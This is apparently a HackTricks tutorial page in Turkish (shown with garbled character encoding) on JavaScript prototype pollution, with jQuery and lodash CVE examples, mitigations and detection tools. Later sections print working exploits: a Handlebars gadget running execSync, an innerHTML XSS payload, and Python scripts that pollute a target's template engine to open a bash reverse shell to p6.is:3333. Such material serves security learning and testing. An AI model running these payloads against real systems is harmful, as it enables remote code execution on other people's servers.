# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan ileri seviyeye Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## JavaScript'te Nesneler <a href="#id-053a" id="id-053a"></a>

JavaScript'te nesneler temelde Ã¶zellikler olarak bilinen anahtar-deÄŸer Ã§iftlerinin koleksiyonlarÄ±dÄ±r. Bir nesne, miras alÄ±nmÄ±ÅŸ Ã¶zelliklere sahip olmayan boÅŸ bir nesne oluÅŸturmak iÃ§in `Object.create` kullanÄ±larak `null` argÃ¼manÄ± ile oluÅŸturulabilir. Bu yÃ¶ntem, miras alÄ±nmÄ±ÅŸ Ã¶zelliklere sahip olmayan bir nesnenin oluÅŸturulmasÄ±na izin verir.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Bir boÅŸ nesne, `{}` ÅŸeklinde temsil edilen boÅŸ bir sÃ¶zlÃ¼ÄŸe benzer.

### JavaScript'te Fonksiyonlar ve SÄ±nÄ±flar

JavaScript'te sÄ±nÄ±flar ve fonksiyonlar sÄ±kÄ± bir ÅŸekilde baÄŸlantÄ±lÄ±dÄ±r, fonksiyonlar genellikle sÄ±nÄ±flar iÃ§in yapÄ±landÄ±rÄ±cÄ±lar olarak hizmet eder. JavaScript'in yerel sÄ±nÄ±f desteÄŸinin olmamasÄ±na raÄŸmen, yapÄ±landÄ±rÄ±cÄ±lar sÄ±nÄ±f davranÄ±ÅŸÄ±nÄ± taklit edebilir.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipler JavaScript'te

JavaScript, prototip Ã¶zelliklerinin Ã§alÄ±ÅŸma zamanÄ±nda deÄŸiÅŸtirilmesine, eklenmesine veya silinmesine izin verir. Bu esneklik, sÄ±nÄ±f iÅŸlevlerinin dinamik olarak geniÅŸletilmesini saÄŸlar.

`toString` ve `valueOf` gibi iÅŸlevlerin davranÄ±ÅŸlarÄ±nÄ± deÄŸiÅŸtirmek iÃ§in deÄŸiÅŸtirilebilir, bu da JavaScript'in prototip sisteminin uyarlanabilir doÄŸasÄ±nÄ± gÃ¶sterir.

## KalÄ±tÄ±m

Prototip tabanlÄ± programlamada, Ã¶zellikler/metodlar sÄ±nÄ±flardan nesnelere miras alÄ±nÄ±r. Bu sÄ±nÄ±flar, Ã¶zellikler/metodlar ekleyerek ya baÅŸka bir sÄ±nÄ±fÄ±n bir Ã¶rneÄŸine ya da boÅŸ bir nesneye oluÅŸturulur.

Bir nesne iÃ§in prototip olarak hizmet eden bir nesneye (Ã¶rneÄŸin `myPersonObj`) bir Ã¶zellik eklenirse, miras alan nesneler bu yeni Ã¶zelliÄŸe eriÅŸir. Ancak bu Ã¶zellik, aÃ§Ä±kÃ§a Ã§aÄŸrÄ±lmadÄ±kÃ§a otomatik olarak gÃ¶rÃ¼ntÃ¼lenmez.

## \_\_proto\_\_ kirliliÄŸi <a href="#id-0d0a" id="id-0d0a"></a>

## JavaScript'te Prototip KirliliÄŸini KeÅŸfetme

JavaScript nesneleri anahtar-deÄŸer Ã§iftleri tarafÄ±ndan tanÄ±mlanÄ±r ve JavaScript Nesne prototipinden miras alÄ±rlar. Bu, Nesne prototipinin deÄŸiÅŸtirilmesinin tÃ¼m ortamdaki tÃ¼m nesneleri etkileyebileceÄŸi anlamÄ±na gelir.

Bunu aÃ§Ä±klamak iÃ§in farklÄ± bir Ã¶rnek kullanalÄ±m:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
EriÅŸim, Object prototipi Ã¼zerinden mÃ¼mkÃ¼ndÃ¼r:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Object prototipine Ã¶zellikler ekleyerek, her JavaScript nesnesi bu yeni Ã¶zellikleri miras alacaktÄ±r:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototype pollution

`__proto__` kullanÄ±mÄ±nÄ±n kÄ±sÄ±tlandÄ±ÄŸÄ± bir senaryo iÃ§in, bir fonksiyonun prototype'ini deÄŸiÅŸtirmek alternatif bir yÃ¶ntemdir:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Bu yalnÄ±zca `Vehicle` yapÄ±cÄ±sÄ±ndan oluÅŸturulan nesneleri etkiler, onlara `beep`, `hasWheels`, `honk` ve `isElectric` Ã¶zelliklerini verir.

JavaScript nesnelerini genel olarak etkilemek iÃ§in iki yÃ¶ntem ÅŸunlardÄ±r:

1. `Object.prototype`'yi doÄŸrudan kirletme:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. SÄ±kÃ§a kullanÄ±lan bir yapÄ±nÄ±n prototipini kirletme:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
## DiÄŸer nesneleri kirletme

### Bir sÄ±nÄ±ftan Object.prototype'a

Belirli bir nesneyi kirletebileceÄŸiniz ve `Object.prototype`'e ulaÅŸmanÄ±z gereken bir senaryoda, aÅŸaÄŸÄ±daki gibi bir kod parÃ§asÄ±yla onu arayabilirsiniz:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Dizi elemanlarÄ± kirliliÄŸi

JS'de nesnelerin Ã¶zelliklerini kirlettiÄŸiniz gibi, bir diziyi kirletme eriÅŸiminiz varsa, dizinin deÄŸerlerini de **dizi indeksleriyle** eriÅŸilebilir ÅŸekilde **kirletebilirsiniz** (deÄŸerleri Ã¼zerine yazamazsÄ±nÄ±z, bu yÃ¼zden kullanÄ±lan ancak yazÄ±lmayan indeksleri kirletmeniz gerekir).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elemanlarÄ± kirliliÄŸi

JS aracÄ±lÄ±ÄŸÄ±yla bir HTML elemanÄ± oluÅŸturulurken, **`innerHTML`** Ã¶zniteliÄŸini **Ã¼zerine yazmak** ve **keyfi HTML kodu yazdÄ±rmak** mÃ¼mkÃ¼ndÃ¼r. [Fikir ve Ã¶rnek bu yazÄ±dan alÄ±nmÄ±ÅŸtÄ±r](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Ã–rnekler

### Temel Ã–rnek

Prototip kirliliÄŸi, uygulamadaki bir hatadan kaynaklanÄ±r ve `Object.prototype` Ã¼zerindeki Ã¶zelliklerin Ã¼zerine yazÄ±lmasÄ±na izin verir. Bu, Ã§oÄŸu nesnenin Ã¶zelliklerini `Object.prototype`'den tÃ¼rettiÄŸi anlamÄ±na gelir.

En basit Ã¶rnek, kontrol edilecek bir nesnenin **tanÄ±msÄ±z bir Ã¶zelliÄŸine** bir deÄŸer eklemektir, Ã¶rneÄŸin:
```javascript
if (user.admin) {
```
EÄŸer **`admin` Ã¶zelliÄŸi tanÄ±msÄ±zsa**, bir PP'yi istismar etmek ve ÅŸuna benzer bir ÅŸeyle True olarak ayarlamak mÃ¼mkÃ¼ndÃ¼r:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Bu mekanizmanÄ±n arkasÄ±ndaki ÅŸey, saldÄ±rganÄ±n belirli girdiler Ã¼zerinde kontrol sahibi olduÄŸunda, uygulamadaki tÃ¼m nesnelerin prototipini deÄŸiÅŸtirebileceÄŸi Ã¶zellikleri manipÃ¼le etmektir. Bu manipÃ¼lasyon genellikle, JavaScript'te bir nesnenin prototipini doÄŸrudan deÄŸiÅŸtirmekle eÅŸ anlamlÄ± olan `__proto__` Ã¶zelliÄŸinin ayarlanmasÄ±nÄ± iÃ§erir.

Bu saldÄ±rÄ±nÄ±n baÅŸarÄ±lÄ± bir ÅŸekilde gerÃ§ekleÅŸtirilebileceÄŸi koÅŸullar, belirli bir [Ã§alÄ±ÅŸmada](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) belirtildiÄŸi gibi ÅŸunlarÄ± iÃ§erir:

* Yinelemeli bir birleÅŸtirme gerÃ§ekleÅŸtirme.
* Bir yol Ã¼zerine tanÄ±mlanan Ã¶zelliklerin belirlenmesi.
* Nesnelerin klonlanmasÄ±.

### Fonksiyonu geÃ§ersiz kÄ±lma
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto KirliliÄŸi ile Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## Ä°stemci tarafÄ± proto kirliliÄŸi ile XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019â€“11358: jQuery $ .extend ile Proto KirliliÄŸi SaldÄ±rÄ±sÄ±

[Daha fazla detay iÃ§in bu makaleye bakÄ±n](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) jQuery'de, `$ .extend` fonksiyonu derin kopya Ã¶zelliÄŸi yanlÄ±ÅŸ kullanÄ±ldÄ±ÄŸÄ±nda proto kirliliÄŸine neden olabilir. Bu fonksiyon genellikle nesneleri klonlamak veya varsayÄ±lan bir nesneden Ã¶zellikleri birleÅŸtirmek iÃ§in kullanÄ±lÄ±r. Ancak yanlÄ±ÅŸ yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda, yeni bir nesne iÃ§in amaÃ§lanan Ã¶zellikler prototipe atanabilir. Ã–rneÄŸin:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Bu zafiyet, CVE-2019â€“11358 olarak tanÄ±mlanmÄ±ÅŸ olup, derin kopyalamanÄ±n yanlÄ±ÅŸlÄ±kla prototipi deÄŸiÅŸtirebileceÄŸini ve `isAdmin` gibi Ã¶zelliklerin uygun varlÄ±k doÄŸrulamasÄ± olmadan kontrol edilmesi durumunda yetkisiz yÃ¶netici eriÅŸimi gibi potansiyel gÃ¼venlik risklerine yol aÃ§abileceÄŸini gÃ¶stermektedir.

### CVE-2018â€“3721, CVE-2019â€“10744: lodash Ã¼zerinden prototip kirliliÄŸi saldÄ±rÄ±sÄ±

[Daha fazla detay iÃ§in bu makaleye bakÄ±n](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) benzer prototip kirliliÄŸi zafiyetleri (CVE-2018â€“3721, CVE-2019â€“10744) ile karÅŸÄ±laÅŸtÄ±. Bu sorunlar 4.17.11 sÃ¼rÃ¼mÃ¼nde ele alÄ±ndÄ±.

### CVE'ler ile baÅŸka bir rehber

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Prototip KirliliÄŸini AlgÄ±lamak Ä°Ã§in AraÃ§lar

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Web uygulamalarÄ±ndaki sunucu tarafÄ± prototip kirliliÄŸi zafiyetlerini tespit etmek ve analiz etmek iÃ§in tasarlanmÄ±ÅŸ Burp Suite eklentisi. Bu araÃ§, potansiyel prototip kirliliÄŸi sorunlarÄ±nÄ± belirlemek iÃ§in tarama iÅŸlemini otomatikleÅŸtirir. Bilinen gadget'larÄ± - zararlÄ± eylemleri gerÃ§ekleÅŸtirmek iÃ§in prototip kirliliÄŸinden yararlanma yÃ¶ntemlerini - Ã¶zellikle Node.js kÃ¼tÃ¼phanelerine odaklanarak kullanÄ±r.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Bu uzantÄ±, sunucu tarafÄ± prototip kirliliÄŸi zafiyetlerini tanÄ±mlar. [Sunucu tarafÄ± prototip kirliliÄŸi](https://portswigger.net/research/server-side-prototype-pollution) aÃ§Ä±klamalarÄ±nda kullanÄ±lan teknikleri kullanÄ±r.

### NodeJS'de AST Prototip KirliliÄŸi

NodeJS, ÅŸablon motorlarÄ± ve TypeScript gibi iÅŸlevler iÃ§in JavaScript'te Soyut SÃ¶zdizimi AÄŸaÃ§larÄ± (AST) yoÄŸun bir ÅŸekilde kullanÄ±r. Bu bÃ¶lÃ¼m, ÅŸablon motorlarÄ±, Ã¶zellikle Handlebars ve Pug ile iliÅŸkili prototip kirliliÄŸi ile ilgili zafiyetleri keÅŸfeder.

#### Handlebars Zafiyet Analizi

Handlebars ÅŸablon motoru, prototip kirliliÄŸi saldÄ±rÄ±sÄ±na aÃ§Ä±ktÄ±r. Bu zafiyet, `javascript-compiler.js` dosyasÄ±ndaki belirli fonksiyonlardan kaynaklanmaktadÄ±r. Ã–rneÄŸin, `appendContent` fonksiyonu, varsa `pendingContent`'i birleÅŸtirirken, `pushSource` fonksiyonu kaynaÄŸÄ± ekledikten sonra `pendingContent`'i `undefined` olarak sÄ±fÄ±rlar.

**SÃ¶mÃ¼rÃ¼ SÃ¼reci**

SÃ¶mÃ¼rÃ¼, Handlebars tarafÄ±ndan Ã¼retilen AST (Soyut SÃ¶zdizimi AÄŸacÄ±) kullanÄ±larak ÅŸu adÄ±mlarÄ± izler:

1. **AyrÄ±ÅŸtÄ±rÄ±cÄ±nÄ±n ManipÃ¼lasyonu**: BaÅŸlangÄ±Ã§ta, ayrÄ±ÅŸtÄ±rÄ±cÄ±, `NumberLiteral` dÃ¼ÄŸÃ¼mÃ¼ aracÄ±lÄ±ÄŸÄ±yla deÄŸerlerin sayÄ±sal olmasÄ±nÄ± zorlar. Prototip kirliliÄŸi, sayÄ±sal olmayan dizelerin eklenmesine olanak tanÄ±yarak bunu atlayabilir.
2. **Derleyici TarafÄ±ndan Ä°ÅŸlenme**: Derleyici, bir AST Objesini veya bir dize ÅŸablonunu iÅŸleyebilir. `input.type` `Program` eÅŸit olduÄŸunda, giriÅŸ Ã¶nceden ayrÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ olarak iÅŸlenir, bu da sÃ¶mÃ¼rÃ¼lebilir.
3. **Kod Enjeksiyonu**: `Object.prototype`'nin manipÃ¼lasyonu aracÄ±lÄ±ÄŸÄ±yla, ÅŸablon fonksiyonuna keyfi kod enjekte edilebilir, bu da uzaktan kod yÃ¼rÃ¼tmesine yol aÃ§abilir.

Handlebars zafiyetinin sÃ¶mÃ¼rÃ¼lmesini gÃ¶steren bir Ã¶rnek:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Bu kod, bir saldÄ±rganÄ±n Handlebars ÅŸablonuna keyfi kod enjekte edebileceÄŸini gÃ¶stermektedir.

**Harici Referans**: Prototip kirliliÄŸi ile ilgili bir sorun, burada detaylarÄ± verilen 'flat' kÃ¼tÃ¼phanesinde bulundu: [GitHub'daki Sorun](https://github.com/hughsk/flat/issues/105).

**Harici Referans**: [flat kÃ¼tÃ¼phanesindeki prototip kirliliÄŸi ile ilgili sorun](https://github.com/hughsk/flat/issues/105)

Python'da prototip kirliliÄŸi sÃ¶mÃ¼rÃ¼sÃ¼ Ã¶rneÄŸi:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug GÃ¼venlik AÃ§Ä±ÄŸÄ±

Pug, baÅŸka bir ÅŸablon motoru, prototip kirliliÄŸi riskiyle karÅŸÄ± karÅŸÄ±yadÄ±r. AyrÄ±ntÄ±lÄ± bilgi, [Pug'da AST Enjeksiyonu](https://blog.p6.is/AST-Injection/#Pug) baÅŸlÄ±klÄ± tartÄ±ÅŸmada bulunabilir.

Pug'da prototip kirliliÄŸi Ã¶rneÄŸi:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Ã–nleyici Ã–nlemler

Prototip kirliliÄŸi riskini azaltmak iÃ§in aÅŸaÄŸÄ±daki stratejiler uygulanabilir:

1. **Nesne DeÄŸiÅŸmezliÄŸi**: `Object.prototype` `Object.freeze` uygulanarak deÄŸiÅŸmez hale getirilebilir.
2. **GiriÅŸ DoÄŸrulamasÄ±**: JSON giriÅŸleri uygulamanÄ±n ÅŸemasÄ±na karÅŸÄ± sÄ±kÄ± bir ÅŸekilde doÄŸrulanmalÄ±dÄ±r.
3. **GÃ¼venli BirleÅŸtirme FonksiyonlarÄ±**: GÃ¼vensiz rekÃ¼rsif birleÅŸtirme fonksiyonlarÄ±nÄ±n kullanÄ±mÄ± kaÃ§Ä±nÄ±lmalÄ±dÄ±r.
4. **Prototipsiz Nesneler**: Prototip Ã¶zellikleri olmayan nesneler `Object.create(null)` kullanÄ±larak oluÅŸturulabilir.
5. **Map KullanÄ±mÄ±**: `Object` yerine anahtar-deÄŸer Ã§iftlerini depolamak iÃ§in `Map` kullanÄ±lmalÄ±dÄ±r.
6. **KÃ¼tÃ¼phane GÃ¼ncellemeleri**: GÃ¼venlik yamalarÄ± dÃ¼zenli olarak gÃ¼ncellenen kÃ¼tÃ¼phanelere entegre edilebilir.
7. **Linter ve Statik Analiz AraÃ§larÄ±**: Prototype kirliliÄŸi zafiyetlerini tespit etmek ve Ã¶nlemek iÃ§in ESLint gibi uygun eklentilere sahip araÃ§lar kullanÄ±lmalÄ±dÄ±r.
8. **Kod Ä°ncelemeleri**: Prototype kirliliÄŸi ile ilgili potansiyel riskleri belirlemek ve gidermek iÃ§in detaylÄ± kod incelemeleri uygulanmalÄ±dÄ±r.
9. **GÃ¼venlik EÄŸitimi**: GeliÅŸtiricileri prototype kirliliÄŸi riskleri ve gÃ¼venli kod yazma en iyi uygulamalarÄ± konusunda eÄŸitin.
10. **Dikkatle KÃ¼tÃ¼phane KullanÄ±mÄ±**: ÃœÃ§Ã¼ncÃ¼ taraf kÃ¼tÃ¼phaneleri kullanÄ±rken dikkatli olun. GÃ¼venlik durumlarÄ±nÄ± deÄŸerlendirin ve Ã¶zellikle nesneleri manipÃ¼le eden kÃ¼tÃ¼phanelerin kodlarÄ±nÄ± gÃ¶zden geÃ§irin.
11. **Ã‡alÄ±ÅŸma ZamanÄ± KorumasÄ±**: Prototype kirliliÄŸi saldÄ±rÄ±larÄ±nÄ± tespit edebilen ve Ã¶nleyebilen gÃ¼venlik odaklÄ± npm paketleri gibi Ã§alÄ±ÅŸma zamanÄ± koruma mekanizmalarÄ± kullanÄ±n.

## Referanslar

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>SÄ±fÄ±rdan ileri seviyeye AWS hackleme konusunda</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶nderin.

</details>
